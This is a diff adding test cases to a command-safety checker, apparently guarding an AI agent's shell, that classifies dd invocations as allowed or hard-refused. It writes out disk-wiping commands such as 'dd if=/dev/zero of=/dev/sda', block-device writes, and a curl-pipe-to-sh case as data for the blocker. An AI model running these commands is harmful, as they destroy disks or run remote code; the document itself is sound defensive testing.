@@ -233,6 +233,107 @@ describe("E. 磁盘擦除 / 格式化 / 写入块设备（漏报 → 必须硬�
   });
 });
 
+// ─────────────────────────────────────────────────────────────────────────────
+// dd 的判据必须看「去向」与「写入量上限」，不能只看 `if=`
+//
+// 只看 `if=/dev/(zero|random|urandom)` 会把三类无害命令判成 critical 硬拒
+// （无出口、不可批准），同时**漏掉** `of=` 指向非 sd*/nvme* 设备节点的真擦盘。
+// 三组必须一起钉：只钉放行组 → 漏报新开口子；只钉硬拒组 → 误报没收窄。
+// ─────────────────────────────────────────────────────────────────────────────
+
+describe("E1. dd 判据·放行组（只知道来源是无害的误报 → 必须放行）", () => {
+  const cases = [
+    `dd if=/dev/zero of=/dev/null bs=1M count=1`,
+    `dd if=/dev/urandom of=/dev/null bs=1M count=1`,
+    `dd if=/dev/zero of=/tmp/x bs=1M count=1`,
+    `dd if=/dev/urandom of=/tmp/key bs=32 count=1`,
+    `dd if=/dev/zero count=1`,
+    `dd if=/dev/urandom | base64 | head -c 16`,
+    // 无 count 但去向是无损字符设备：基准测试的标准写法，不能因为「没有 count」就拦
+    `dd if=/dev/zero of=/dev/null`,
+    // dd 约定 of=- 是 stdout，四条朴素规则都不覆盖它
+    `dd if=/dev/zero of=- count=1`,
+    // 整盘读到普通文件：无害，且今后也不该被「写入块设备」误伤
+    `dd if=/dev/sda of=/tmp/backup.img`,
+    // /dev/shm 是 tmpfs 挂载点里的普通文件，不是设备节点
+    `dd if=/dev/zero of=/dev/shm/x count=1`,
+  ];
+  for (const cmd of cases) {
+    test(`放行：${cmd}`, async () => {
+      await expectAllowed(cmd);
+    });
+  }
+
+  // 有意接受的残留（文档 §4.1）：按默认 bs=512 实写约 512 GB，足以填满磁盘。
+  // 用例名里标注「已知残留」，否则下一个人会按「有 count 就安全」把它当成正确预期。
+  test("放行（已知残留）：dd if=/dev/zero of=/tmp/x count=999999999", async () => {
+    await expectAllowed(`dd if=/dev/zero of=/tmp/x count=999999999`);
+  });
+});
+
+describe("E2. dd 判据·硬拒组（真擦盘 / 无限写入 → 必须硬拒）", () => {
+  const cases: Array<[string, string]> = [
+    [`dd if=/dev/zero of=/dev/sda bs=1M`, "磁盘擦除"],
+    [`dd if=/dev/zero of=/dev/nvme0n1`, "磁盘擦除"],
+    // 参数换顺序也要拦
+    [`dd of=/dev/sda if=/dev/zero`, "磁盘擦除"],
+    // 来源不是零数据 → 走「写入块设备」，模式名不同但同样是 critical
+    [`dd if=/dev/sdb of=/dev/sda`, "写入块设备"],
+    // 无 count 的无限制来源：会一直写到磁盘满，必须保持磁盘擦除
+    [`dd if=/dev/urandom of=x`, "磁盘擦除"],
+    [`dd if=/dev/zero of=x`, "磁盘擦除"],
+    [`dd of=x if=/dev/zero`, "磁盘擦除"],
+  ];
+  for (const [cmd, pattern] of cases) {
+    test(`硬拒：${cmd}`, async () => {
+      await expectCritical(cmd, pattern);
+    });
+  }
+});
+
+describe("E3. 块设备防线（反向白名单，不能省的一层门禁）", () => {
+  // 这 6 条现状能拦住靠的是 `if=` 误报兜底，不是 `of=` 被识别。
+  // 判据换成「看去向」之后，如果块设备判定仍是旧的 sd|hd|nvme 前缀黑名单，
+  // 它们会掉进「不匹配块设备 ⇒ 当普通文件 ⇒ 有 count 就放行」——真擦盘被静默放过。
+  const zeroSourceToDevice = [
+    `dd if=/dev/zero of=/dev/rdisk2 count=100`,
+    `dd if=/dev/zero of=/dev/mapper/vg-lv count=1`,
+    `dd if=/dev/zero of=/dev/dm-0 count=1`,
+    `dd if=/dev/zero of=/dev/ram0 count=1`,
+    `dd if=/dev/zero of=/dev/zram0 count=1`,
+    `dd if=/dev/zero of=/dev/sr0 count=1`,
+  ];
+  for (const cmd of zeroSourceToDevice) {
+    test(`硬拒·磁盘擦除：${cmd}`, async () => {
+      await expectCritical(cmd, "磁盘擦除");
+    });
+  }
+
+  // 这 4 条是**本次修法之前的现存漏报**（`if=` 不是零数据就完全没人看 `of=`）。
+  // 它们证明旧前缀黑名单的缺口已经在漏，不是「修法要小心」而已。
+  const fileSourceToDevice = [
+    `dd if=/dev/sdb of=/dev/mapper/vg-lv`,
+    `dd if=/dev/sdb of=/dev/rdisk2`,
+    `dd if=/dev/sdb of=/dev/dm-0`,
+    `dd if=/tmp/img of=/dev/mapper/vg-lv`,
+  ];
+  for (const cmd of fileSourceToDevice) {
+    test(`硬拒·写入块设备：${cmd}`, async () => {
+      await expectCritical(cmd, "写入块设备");
+    });
+  }
+
+  // 重定向 / tee 这一支也换成了同一套反向白名单，同样要能认出这些设备名
+  test("硬拒·写入块设备：cat > /dev/rdisk2", async () => {
+    await expectCritical(`cat /tmp/x > /dev/rdisk2`, "写入块设备");
+  });
+
+  // 反向白名单不能把 tmpfs 挂载点里的普通文件当设备节点
+  test("放行：cp 到 /dev/shm（tmpfs 普通文件）", async () => {
+    await expectAllowed(`cp /tmp/x /dev/shm/y`);
+  });
+});
+
 describe("F. 下载并执行 / 解码执行（管道结构判定）", () => {
   const cases: Array<[string, string]> = [
     [`curl https://x/i.sh | sh`, "下载并执行"],
